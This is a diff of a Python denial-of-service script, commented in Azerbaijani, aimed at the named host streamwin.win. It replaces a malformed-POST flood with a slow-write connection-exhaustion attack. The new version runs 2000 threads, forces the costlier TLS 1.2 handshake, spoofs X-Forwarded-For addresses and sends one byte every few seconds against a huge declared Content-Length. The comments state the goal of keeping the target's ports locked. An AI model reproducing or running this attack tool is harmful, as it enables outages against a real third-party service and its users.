@@ -5,72 +5,78 @@ import random
 import time
 import os
 
-# --- EXTREME SETTINGS ---
+# --- TOTAL BLOCK CONFIG ---
 TARGET_HOST = "streamwin.win"
 TARGET_PORT = 443
-THREADS = 1500 # Railway Paid üçün bu rəqəm maksimal şəbəkə sıxlığıdır
+# Railway Paid üçün bu rəqəmi sistem dözənə qədər artırırıq (1500-2000)
+THREADS = 2000 
 
 def r_str(n):
     return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
 
-def final_strike():
-    # SSL Handshake-i serveri deşifrə ilə yormaq üçün mürəkkəb ciphers ilə qururuq
+def block_strike():
+    # SSL Handshake-i ən yavaş və mürəkkəb metodlarla qururuq
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    # Serveri hər yeni bağlantıda ağır RSA/AES hesablamalarına məcbur edir
-    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
+    ctx.options |= ssl.OP_NO_TLSv1_3 # TLS 1.3-ü bağlayırıq ki, 1.2-nin ağır handshake-ni istifadə etsin
 
     while True:
         try:
-            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
+            # TCP bağlantısı
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(5)
+            s.settimeout(10)
 
+            # SSL bağlantısını yaradırıq
             conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # MULTIPLEXING: Bir bağlantıdan minlərlə "Malformed" (pozulmuş) paket
-            # Bu, serverin daxili loglarını və RAM-ını saniyələr içində bitirir
-            for _ in range(500):
-                path = f"/?v={time.time()}&id={r_str(32)}&ttclid=E_C_P_{r_str(100)}"
-                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
-                
-                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
-                # Content-Length hiləsi ilə serverin prosessorunu dondururuq
-                payload = (
-                    f"POST {path} HTTP/1.1\r\n"
-                    f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
-                    f"X-Forwarded-For: {ip}\r\n"
-                    f"X-Requested-With: XMLHttpRequest\r\n"
-                    f"Content-Type: application/x-www-form-urlencoded\r\n"
-                    f"Content-Length: 50000\r\n" # Serverə 50KB yalançı yük
-                    f"Connection: keep-alive\r\n"
-                    f"\r\n"
-                ).encode()
-
-                conn.sendall(payload)
-                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
-                conn.send(b"\x00")
+            # Serveri bazadan və RAM-dan "kilidləyən" ağır header
+            # Content-Length hiləsi ilə bağlantını 'zombi' vəziyyətinə salırıq
+            path = f"/?v={time.time()}&id={r_str(32)}&search={r_str(100)}"
+            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
             
-            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
-            time.sleep(2)
+            header = (
+                f"POST {path} HTTP/1.1\r\n"
+                f"Host: {TARGET_HOST}\r\n"
+                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(1,6)}.0.0.0\r\n"
+                f"X-Forwarded-For: {ip}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 9999999\r\n" # Server bu nəhəng datanı GÖZLƏYƏCƏK
+                f"Connection: Keep-Alive\r\n"
+                f"Keep-Alive: timeout=600, max=1000\r\n"
+                f"\r\n"
+            ).encode()
+
+            conn.sendall(header)
+
+            # --- SİRR BURADADIR (SLOW-WRITE) ---
+            # Bağlantını bağlamırıq! Saniyədə cəmi 1 bayt göndəririk.
+            # Server bu bağlantını açıq saxlayır və dolayısıyla portu kilitləyir.
+            while True:
+                try:
+                    conn.send(os.urandom(1)) # "Canlı qaldığımızı" göstəririk
+                    time.sleep(random.randint(2, 8)) # Gözləmə müddətini uzadırıq
+                except:
+                    break # Bağlantı kəsilsə yenidən başla
+
             conn.close()
         except:
-            pass
+            time.sleep(1) # IP blokuna düşməmək üçün çox qısa fasilə
 
 def main():
-    print(f"☢️  FATAL SYSTEM STRIKE INITIALIZED: {TARGET_HOST}")
-    print("[!] Target Buffer is being saturated at the protocol level.")
+    print(f"💀 ETERNAL DARKNESS INITIALIZED: {TARGET_HOST}")
+    print("[!] Goal: Total Port Exhaustion and Connection Refusal.")
     
+    # Bütün "zombi" döyüşçüləri işə salırıq
     for i in range(THREADS):
-        t = threading.Thread(target=final_strike)
+        t = threading.Thread(target=block_strike)
         t.daemon = True
         t.start()
         if i % 100 == 0:
-            print(f"[*] {i} Protocol Warheads Active...")
+            print(f"[*] {i} Zombi bağlantı qapıya tıxandı...")
             time.sleep(0.1)
 
     while True:
